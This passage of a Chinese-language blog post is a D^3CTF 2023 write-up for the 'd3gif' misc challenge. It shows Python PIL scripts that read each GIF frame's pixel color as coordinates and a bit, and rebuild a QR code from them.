+        title="image-20230509152051874" /></p>
+<h2 id="heading"></h2>
+<h2 id="d3gif">d3gif</h2>
+<p>拿到gif第一步就想的是分离哈哈哈</p>
+<p>gif分离出1089个png，这个gif的名字是(x,y,bin).gif</p>
+<p>观察后发现，</p>
+<p>应该是拿到每帧背景的RGB数据，然后前两位做x y 最后一位做bin</p>
+<p>发现最后一位确实只有0或1 ，印证的猜想</p>
+<p>写脚本提取出来数据</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> PIL <span style="color:#f92672">import</span> Image
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 定义处理函数</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">extract_pixel_color</span>(image_path):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> Image<span style="color:#f92672">.</span>open(image_path) <span style="color:#66d9ef">as</span> image:
+</span></span><span style="display:flex;"><span>        color <span style="color:#f92672">=</span> image<span style="color:#f92672">.</span>getpixel((<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> color
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>input_directory <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Users\达\Desktop\(x,y,bin)&#39;</span>  <span style="color:#75715e"># 修改为图片所在目录的路径</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">1090</span>):
+</span></span><span style="display:flex;"><span>    file_name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;第</span><span style="color:#e6db74">{0}</span><span style="color:#e6db74">帧.png&#34;</span><span style="color:#f92672">.</span>format(i)
+</span></span><span style="display:flex;"><span>    print(file_name)
+</span></span><span style="display:flex;"><span>    image_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(input_directory, file_name)
+</span></span><span style="display:flex;"><span>    color <span style="color:#f92672">=</span> extract_pixel_color(image_path)
+</span></span><span style="display:flex;"><span>    x <span style="color:#f92672">=</span> color[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>    y <span style="color:#f92672">=</span> color[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>    bin <span style="color:#f92672">=</span> color[<span style="color:#ae81ff">2</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Users\达\Desktop\(x,y,bin)</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">xy.txt&#39;</span>,<span style="color:#e6db74">&#39;a&#39;</span>) <span style="color:#66d9ef">as</span> result:
+</span></span><span style="display:flex;"><span>         result<span style="color:#f92672">.</span>write(str(x)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">+</span>str(y)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Users\达\Desktop\(x,y,bin)</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">bin.txt&#39;</span>, <span style="color:#e6db74">&#39;a&#39;</span>) <span style="color:#66d9ef">as</span> bins:
+</span></span><span style="display:flex;"><span>        bins<span style="color:#f92672">.</span>write(str(bin))
+</span></span></code></pre></div><p>当时的思路是拿到x,y后去画了个坐标</p>
+<!-- raw HTML omitted -->
+<p>后面的二进制是拿取转字符了，出来一堆乱码，哈哈哈。</p>
+<p>反应过来了，是应该拿坐标后，这个坐标对应的二进制转黑白像素，画图</p>
+<p>1089开方后是39，所以大概率就是个39x39的二维码了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> PIL <span style="color:#f92672">import</span> Image
+</span></span><span style="display:flex;"><span>x <span style="color:#f92672">=</span> [<span style="color:#f92672">...</span>]
+</span></span><span style="display:flex;"><span>y <span style="color:#f92672">=</span> [<span style="color:#f92672">...</span>]
+</span></span><span style="display:flex;"><span>bin <span style="color:#f92672">=</span> [<span style="color:#f92672">...</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 图像尺寸和背景颜色</span>
+</span></span><span style="display:flex;"><span>width <span style="color:#f92672">=</span> <span style="color:#ae81ff">33</span>
+</span></span><span style="display:flex;"><span>height <span style="color:#f92672">=</span> <span style="color:#ae81ff">33</span>
+</span></span><span style="display:flex;"><span>bg_color <span style="color:#f92672">=</span> (<span style="color:#ae81ff">255</span>, <span style="color:#ae81ff">255</span>, <span style="color:#ae81ff">255</span>) <span style="color:#75715e">#背景为白色</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>im <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>new(<span style="color:#e6db74">&#34;RGB&#34;</span>, (width, height), bg_color)
+</span></span><span style="display:flex;"><span>pix <span style="color:#f92672">=</span> im<span style="color:#f92672">.</span>load()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1089</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> bin[i]<span style="color:#f92672">==</span><span style="color:#ae81ff">1</span>:  <span style="color:#75715e">#bin为1 则设置黑色</span>
+</span></span><span style="display:flex;"><span>        pix[x[i], y[i]] <span style="color:#f92672">=</span> (<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>im<span style="color:#f92672">.</span>save(<span style="color:#e6db74">&#34;output.png&#34;</span>)
+</span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202305091528321.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202305091528321.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202305091528321.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202305091528321.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202305091528321.png"
+        title="image-20230509152819953" /></p>
+<p>不过顺着当时的错误思路进行改正写的脚本，不太优雅</p>
+<p>跟着学别的师傅的脚本思路复现一下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> PIL <span style="color:#f92672">import</span> Image
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>image <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#34;(x,y,bin).gif&#34;</span>)
+</span></span><span style="display:flex;"><span>new_image <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>new(<span style="color:#e6db74">&#34;RGB&#34;</span>,(<span style="color:#ae81ff">39</span>,<span style="color:#ae81ff">39</span>),(<span style="color:#ae81ff">255</span>, <span style="color:#ae81ff">255</span>, <span style="color:#ae81ff">255</span>)) <span style="color:#75715e">#背景为宽高39的白色</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>my_list <span style="color:#f92672">=</span> [] <span style="color:#75715e">#存每帧的rgb</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>        image<span style="color:#f92672">.</span>seek(image<span style="color:#f92672">.</span>tell() <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)  <span style="color:#75715e"># 定位gif的帧从1到1089</span>
+</span></span><span style="display:flex;"><span>        my_list<span style="color:#f92672">.</span>append(image<span style="color:#f92672">.</span>getpixel((<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>)))  <span style="color:#75715e"># 获取每帧的rgb值</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># print(my_list)</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> <span style="color:#a6e22e">EOFError</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> x,y,bin <span style="color:#f92672">in</span> my_list:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> bin <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>        new_image<span style="color:#f92672">.</span>putpixel((x,y),(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>)) <span style="color:#75715e">#如果bin为1,则这块像素为黑</span>
+</span></span><span style="display:flex;"><span>new_image<span style="color:#f92672">.</span>save(<span style="color:#e6db74">&#34;flag.png&#34;</span>)
+</span></span></code></pre></div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-08-20</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://thnpkm.github.io/posts/ctf/d3ctf-2023/" data-title="D^3ctf 2023" data-hashtags=""><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://thnpkm.github.io/posts/ctf/d3ctf-2023/" data-hashtag=""><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://thnpkm.github.io/posts/ctf/d3ctf-2023/" data-title="D^3ctf 2023"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://thnpkm.github.io/posts/ctf/d3ctf-2023/" data-title="D^3ctf 2023"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@6.20.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://thnpkm.github.io/posts/ctf/d3ctf-2023/" data-title="D^3ctf 2023"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/ctf/das-x-su/" class="prev" rel="prev" title="DAS x SU"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>DAS x SU</a>
+            <a href="/posts/ctf/ciscn2023%E5%88%9D%E8%B5%9B/" class="next" rel="next" title="ciscn2023初赛">ciscn2023初赛<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.133.0">Hugo</a> | Theme - <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="noopener noreffer" title="KeepIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> KeepIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"search":{"highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
